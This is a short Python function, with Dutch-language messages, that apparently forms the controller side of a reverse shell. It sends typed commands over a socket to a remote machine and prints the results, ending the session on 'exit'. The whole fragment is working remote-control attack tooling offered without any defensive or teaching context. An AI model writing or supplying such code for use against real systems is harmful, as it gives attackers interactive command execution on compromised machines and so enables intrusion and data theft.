
def start_reverse_shell(sock):
    print("[*] Reverse shell actief. Typ commando's ('exit' om te stoppen).\n")
    while True:
        try:
            command = input("shell> ")
            if command.lower() in ("exit", "quit"):
                sock.send(b":exit:\n")
                break
            sock.send(command.encode('utf-8'))
            output = sock.recv(4096).decode('utf-8')
            print(output)
        except Exception as e:
            print(f"[!] Fout in shell: {e}")
            break
